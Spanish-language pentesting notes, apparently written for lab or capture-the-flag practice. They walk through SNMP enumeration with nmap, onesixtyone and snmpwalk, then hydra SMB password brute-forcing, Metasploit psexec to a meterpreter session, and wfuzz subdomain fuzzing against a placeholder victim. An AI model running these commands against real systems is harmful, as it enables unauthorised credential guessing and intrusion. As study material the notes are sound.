
El protocolo SNMP trabaja por UDP así que tendremos que realizar el escaneo de [[00. Apuntes/01. Herramientas/NMAP|NMAP]] a través de este protocolo con el puerto 161.
haremos un primer escaneo
`nmap -p 161 -sU <IP_Victima>`
Y un segundo escaneo con
`nmap -sU -p 161 --script=snmp-brute <IP_Victima>`
El cual nos muestra los comunity names

Utilizamos la herramienta [[ONESIXTYONE]] con los siguientes parámetros. Esta herramienta sirve para obtener la clave para poder enumerar mejor este protocolo SNMP, hac3e lo mismo que el comando anterior de [[NMAP]]
`onesixtyone -c /usr/share/wordlists/rockyou.txt <Ip_Victima>`

Ahora usaremos la herramienta [[SNMPWALK]] con los siguientes parámetros y la clave obtenida con la herramienta ONESIXTYONE o [[NMAP]]
`snmpwalk -v 2c -c <clave/comunity names> <Ip_Vixctima>`

La información obtenida no es legible así que usaremos el siguiente script de [[NMAP]] para guardarlo en un fichero
`nmap -sU -p 161 --script snmp-* <IP_Victima> > snmp_output`

En el archivo creado se guardara toda la información necesaria sobre el servicio en el que podemos encontrar usuarios, estos los deberemos de guardar en un fichero .txt para mas adelante usarlos para hacer fuerza bruta con [[HYDRA]].
`hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP_Victima> smb`

Con los usuarios encontrados probamos a acceder al servicio a través de [[METASPLOIT]]
usaremos el siguiente modulo
`use exploit/windows/smb/psexec`

Obtendremos una sesión de meterpreter.




Si al enumerar encontramos un dominio o un dato relevante podemos añadirlo al fichero `/etc/hosts` junto con la IP de la maquina victima y así poder ver que hay en el dominio en este caso.
Una vez hayamos conseguido acceder al dominio podremos buscar subdominios utilizando Fuzzing
`wfuzz -c --hc 404 --hl 11 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.chaincorp.nyx" -u 192.168.1.120`